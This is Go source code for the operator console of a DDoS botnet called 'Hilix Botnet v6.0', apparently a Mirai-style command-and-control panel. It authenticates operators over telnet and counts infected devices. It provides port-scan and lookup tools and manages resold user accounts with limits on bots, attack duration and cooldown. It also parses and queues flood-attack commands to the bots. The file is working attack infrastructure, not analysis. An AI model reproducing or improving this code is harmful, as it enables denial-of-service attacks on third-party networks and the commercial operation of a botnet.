package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
	"net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[97m[\033[0;32mHilix \033[37mv6.0\033[97m] \r\n"))
    this.conn.Write([]byte("\033[0;32mUsername\033[1;37m: \033[1;37m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;32mPassword\033[1;37m: \033[1;37m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[1;37mVerifying... \033[0;32m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[0;32;1Wrong Shit\r\n"))
        this.conn.Write([]byte("\033[0;31Ur ip Was logged! (any key to exit)\033[0;32m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    this.conn.Write([]byte("\r\n\033[0;32m"))
    this.conn.Write([]byte("\033[1;37m[+] DDOS \033[97m| \033[0;32mSuccesfully hijacked connection\r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[1;37m[+] DDOS \033[97m| \033[0;32mMasking connection from utmp+wtmp...\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[1;37m[+] DDOS \033[97m| \033[0;32mHiding from netstat...\r\n"))
    time.Sleep(150 * time.Millisecond)
    this.conn.Write([]byte("\033[1;37m[+] DDOS \033[97m| \033[0;32mRemoving all traces of LD_PRELOAD...\r\n"))
    for i := 0; i < 4; i++ {
        time.Sleep(100 * time.Millisecond)
    }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Devices | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[1;37m \r\n"))
	this.conn.Write([]byte("\033[1;37m         :::    ::: ::::::::::: :::        ::::::::::: :::    ::: \r\n"))
	this.conn.Write([]byte("\033[1;37m        :+:    :+:     :+:     :+:            :+:     :+:    :+:  \r\n"))
	this.conn.Write([]byte("\033[1;37m       +:+    +:+     +:+     +:+            +:+      +:+  +:+    \r\n"))
	this.conn.Write([]byte("\033[1;37m      +#++:++#++     +#+     +#+            +#+       +#++:+      \r\n"))
	this.conn.Write([]byte("\033[1;37m     +#+    +#+     +#+     +#+            +#+      +#+  +#+      \r\n"))
	this.conn.Write([]byte("\033[1;37m    #+#    #+#     #+#     #+#            #+#     #+#    #+#      \r\n")) 
	this.conn.Write([]byte("\033[1;37m   ###    ### ########### ########## ########### ###    ###       \r\n"))
		  this.conn.Write([]byte("\033[1;37m \r\n"))
	  this.conn.Write([]byte("\033[0;32m[+] DDOS \033[97m| \033[0;32mSharing access IS prohibited!\r\n\033[90;32m[+] DDOS \033[97m| \033[0;32mBotnet terminal started.\r\n"))
	  this.conn.Write([]byte("\033[1;37m \r\n"))
	  this.conn.Write([]byte("\033[1;37m \r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[0;32mHilix\033[01;37m $ \033[1;37m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "hilix" || cmd == "Hilix" || cmd == "h" {

	this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[1;37m \r\n"))	
	this.conn.Write([]byte("\033[1;37m         :::    ::: ::::::::::: :::        ::::::::::: :::    ::: \r\n"))
	this.conn.Write([]byte("\033[1;37m        :+:    :+:     :+:     :+:            :+:     :+:    :+:  \r\n"))
	this.conn.Write([]byte("\033[1;37m       +:+    +:+     +:+     +:+            +:+      +:+  +:+    \r\n"))
	this.conn.Write([]byte("\033[1;37m      +#++:++#++     +#+     +#+            +#+       +#++:+      \r\n"))
	this.conn.Write([]byte("\033[1;37m     +#+    +#+     +#+     +#+            +#+      +#+  +#+      \r\n"))
	this.conn.Write([]byte("\033[1;37m    #+#    #+#     #+#     #+#            #+#     #+#    #+#      \r\n")) 
	this.conn.Write([]byte("\033[1;37m   ###    ### ########### ########## ########### ###    ###       \r\n"))
	  this.conn.Write([]byte("\033[1;37m \r\n"))
	  this.conn.Write([]byte("\033[1;37m \r\n"))
            continue
        }
		
		if cmd == "help" || cmd == "Help" || cmd == "HELP" {
            this.conn.Write([]byte("\033[1;37m ╔═══════════════════════════════════╗                                      \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[0;32madmin   - \033[01;37mShow admins Commands    \033[1;37m║ \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[0;32minfo    - \033[01;37mShow information        \033[1;37m║ \r\n"))
			this.conn.Write([]byte("\033[1;37m ║ \033[0;32mTools    - \033[01;37mShow Tools             \033[1;37m║ \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[0;32m?       - \033[01;37mShow Attacks Methods    \033[1;37m║ \r\n"))
			this.conn.Write([]byte("\033[1;37m ║ \033[0;32mhilix   - \033[01;37mShow Hilix banner       \033[1;37m║ \r\n"))
            this.conn.Write([]byte("\033[1;37m ╚═══════════════════════════════════╝                                      \r\n"))
            continue
        }
		if userInfo.admin == 0 && cmd == "admin" {
            this.conn.Write([]byte("\033[1;37m ║ \033[0;32mThis Command is Only for ADMINS!  \033[1;37m║ \r\n"))
            continue
        }
		
		if err != nil || cmd == "TOOLS" || cmd == "TOOL" || cmd == "tool" || cmd == "tools" {
            this.conn.Write([]byte("\x1b[1;37m[\x1b[0;32m!\x1b[1;37m]\x1b[1;37m- + - + - + - + - + - + - + - + - + - + - + - + - + - + -\x1b[1;37m[\x1b[0;32m!\x1b[1;37m] \r\n"))
            this.conn.Write([]byte(" \x1b[1;37m|     \x1b[1;37m                      \x1b[0;32mTools                           \x1b[1;37m|  \r\n"))
            this.conn.Write([]byte(" \x1b[1;37m+ \x1b[1;37m/ping                    \x1b[0;32m ___)--> \x1b[0mPings An IP             \x1b[1;37m+  \r\n"))
            this.conn.Write([]byte(" \x1b[1;37m| \x1b[1;37m/iplookup                \x1b[0;32m ___)--> \x1b[0mIP Lookup               \x1b[1;37m|  \r\n"))
            this.conn.Write([]byte(" \x1b[1;37m+ \x1b[1;37m/portscan                \x1b[0;32m ___)--> \x1b[0mPortscans IP            \x1b[1;37m+  \r\n"))
            this.conn.Write([]byte(" \x1b[1;37m| \x1b[1;37m/whois                   \x1b[0;32m ___)--> \x1b[0mWHOIS Search            \x1b[1;37m|  \r\n"))
            this.conn.Write([]byte(" \x1b[1;37m+ \x1b[1;37m/traceroute              \x1b[0;32m ___)--> \x1b[0mTraceroute On IP        \x1b[1;37m+  \r\n"))
            this.conn.Write([]byte(" \x1b[1;37m| \x1b[1;37m/resolve                 \x1b[0;32m ___)--> \x1b[0mResolves A Website      \x1b[1;37m|  \r\n"))
            this.conn.Write([]byte(" \x1b[1;37m+ \x1b[1;37m/reversedns              \x1b[0;32m ___)--> \x1b[0mFinds DNS Of IP         \x1b[1;37m+  \r\n"))
            this.conn.Write([]byte(" \x1b[1;37m| \x1b[1;37m/asnlookup               \x1b[0;32m ___)--> \x1b[0mFinds ASN Of Ip         \x1b[1;37m|  \r\n"))
            this.conn.Write([]byte(" \x1b[1;37m+ \x1b[1;37m/subnetcalc              \x1b[0;32m ___)--> \x1b[0mCalculates A Subnet     \x1b[1;37m+  \r\n"))
            this.conn.Write([]byte(" \x1b[1;37m| \x1b[1;37m/zonetransfer            \x1b[0;32m ___)--> \x1b[0mShows ZoneTransfer      \x1b[1;37m|  \r\n"))
            this.conn.Write([]byte("\x1b[1;37m[\x1b[0;32m!\x1b[1;37m]\x1b[1;37m- + - + - + - + - + - + - + - + - + - + - + - + - + - + -\x1b[1;37m[\x1b[0;32m!\x1b[1;37m] \r\n"))
            continue
        }
		
		if err != nil || cmd == "/IPLOOKUP" || cmd == "/iplookup" {
            this.conn.Write([]byte("\x1b[0;32mIP Address\x1b[1;37m: \x1b[0;32m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[0;32m: \r\n\x1b[0;32m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/PORTSCAN" || cmd == "/portscan" {                  
            this.conn.Write([]byte("\x1b[0;32mIP Address\x1b[1;37m: \x1b[0;32m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[1;37m: \r\n\x1b[0;32m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/WHOIS" || cmd == "/whois" {
            this.conn.Write([]byte("\x1b[0;32mIP Address\x1b[1;37m: \x1b[0;32m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[0;32m: \r\n\x1b[0;32m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/PING" || cmd == "/ping" {
            this.conn.Write([]byte("\x1b[0;32mIP Address\x1b[1;37m: \x1b[0;32m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[0;32m: \r\n\x1b[0;32m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/traceroute" || cmd == "/TRACEROUTE" {                  
            this.conn.Write([]byte("\x1b[0;32mIP Address\x1b[1;37m: \x1b[0;32m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[1;37m: \r\n\x1b[0;32m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/resolve" || cmd == "/RESOLVE" {                  
            this.conn.Write([]byte("\x1b[0;32mWebsite (Without www.)\x1b[1;37m: \x1b[0;32m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[1;37m: \r\n\x1b[0;32m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/reversedns" || cmd == "/REVERSEDNS" {
            this.conn.Write([]byte("\x1b[0;32mIP Address\x1b[1;37m: \x1b[0;32m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[0;32m: \r\n\x1b[0;32m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/asnlookup" || cmd == "/asnlookup" {
            this.conn.Write([]byte("\x1b[0;32mIP Address\x1b[1;37m: \x1b[0;32m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[0;32m: \r\n\x1b[0;32m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/subnetcalc" || cmd == "/SUBNETCALC" {
            this.conn.Write([]byte("\x1b[0;32m IP Address\x1b[1;37m: \x1b[0;32m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[0;32m: \r\n\x1b[0;32m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/zonetransfer" || cmd == "/ZONETRANSFER" {
            this.conn.Write([]byte("\x1b[0;32mIP Address Or Website (Without www.)\x1b[1;37m: \x1b[0;32m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[0;32m: \r\n\x1b[0;32m" + locformatted + "\r\n"))
        }
		
		if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\033[1;37m ╔═════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[0;32m/addbasic - \033[01;37mAdd Basic Client    \033[1;37m║\r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[0;32m/addadmin - \033[01;37mAdd Admin Client    \033[1;37m║ \r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[0;32m/remove    - \033[01;37mRemove User        \033[1;37m║ \r\n"))
            this.conn.Write([]byte("\033[1;37m ╚═════════════════════════════════╝  \r\n"))
            continue
        }
		
				if userInfo.admin == 1 && cmd == "server" {
            this.conn.Write([]byte("\033[1;37m ╔═════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[0;32mbots      - \033[01;37mShow botcount       \033[1;37m║\r\n"))
            this.conn.Write([]byte("\033[1;37m ║ \033[0;32mcls       - \033[01;37mClea screen         \033[1;37m║ \r\n"))
            this.conn.Write([]byte("\033[1;37m ╚═════════════════════════════════╝  \r\n"))
            continue
        }
		
		if cmd == "info" || cmd == "INFO" || cmd == "Info" {


	this.conn.Write([]byte("\033[1;37m \r\n"))	
	this.conn.Write([]byte("\033[1;37m   ╔╗║Hilix Botnet v6.0  ║╔╗\r\n"))
	this.conn.Write([]byte("\033[1;37m   ╚╝║Created By: Usip <3║╚╝\r\n"))
	  this.conn.Write([]byte("\033[1;37m \r\n"))
	  this.conn.Write([]byte("\033[1;37m \r\n"))
            continue
        }
		
		
		 if cmd == "cls" || cmd == "clear" || cmd == "c" {
	this.conn.Write([]byte("\033[2J\033[1H"))	
	
            continue
        }
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }
        botCount = userInfo.maxBots
		
			if userInfo.admin == 1 && cmd == "/addbasic" {
            this.conn.Write([]byte("\033[0;32mUsername:\033[1;37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0;32mPassword:\033[1;37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0;32mBotcount\033[0;32m(\033[0;32m-1 for access to all\033[0;32m)\033[0;32m:\033[1;37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[0;32m%s\033[0;32m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0;32mAttack Duration\033[0;32m(\033[0;32m-1 for none\033[0;32m)\033[0;32m:\033[1;37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[0;32m%s\033[0;32m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0;32mCooldown\033[0;32m(\033[0;32m0 for none\033[0;32m)\033[0;32m:\033[1;37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[0;32m%s\033[0;32m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0;32m- New user info - \r\n- Username - \033[0;32m" + new_un + "\r\n\033[0;32m- Password - \033[0;32m" + new_pw + "\r\n\033[0;32m- Bots - \033[0;32m" + max_bots_str + "\r\n\033[0;32m- Max Duration - \033[0;32m" + duration_str + "\r\n\033[0;32m- Cooldown - \033[0;32m" + cooldown_str + "   \r\n\033[0;32mContinue? \033[0;32m(\033[01;32my\033[0;32m/\033[1;31mn\033[0;32m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0;32m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0;32m\r\n"))
            }
            continue
        }
		
		if userInfo.admin == 1 && cmd == "/addadmin" {
            this.conn.Write([]byte("\033[0;32mUsername:\033[1;37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0;32mPassword:\033[1;37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0;32mBotcount\033[0;32m(\033[0;32m-1 for access to all\033[0;32m)\033[0;32m:\033[1;37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0;32m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0;32mAttack Duration\033[0;32m(\033[0;32m-1 for none\033[0;32m)\033[0;32m:\033[1;37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0;32m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0;32mCooldown\033[0;32m(\033[0;32m0 for none\033[0;32m)\033[0;32m:\033[1;37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0;32m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0;32m- New user info - \r\n- Username - \033[0;32m" + new_un + "\r\n\033[0;32m- Password - \033[0;32m" + new_pw + "\r\n\033[0;32m- Bots - \033[0;32m" + max_bots_str + "\r\n\033[0;32m- Max Duration - \033[0;32m" + duration_str + "\r\n\033[0;32m- Cooldown - \033[0;32m" + cooldown_str + "   \r\n\033[0;32mContinue? \033[0;32m(\033[01;32my\033[0;32m/\033[1;31mn\033[0;32m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0;32m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0;32m\r\n"))
            }
            continue
        }
		
		if userInfo.admin == 1 && cmd == "/remove" {
            this.conn.Write([]byte("\033[0;32mUsername: \033[1;37m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[01;37mAre You Sure You Want To Remove \033[0;32m" + rm_un + "?\033[0;31m(\033[0;31my\033[0;31m/\033[1;31mn\033[0;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[0;32mUser Successfully Removed!\r\n"))
            }
            continue
        }
		
        if userInfo.admin == 1 && cmd == "bots" || cmd == "arch" {
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[0;32m%s:\t%d\033[1;37m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0;32m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0;32m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0;32m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0;32m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0;32m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
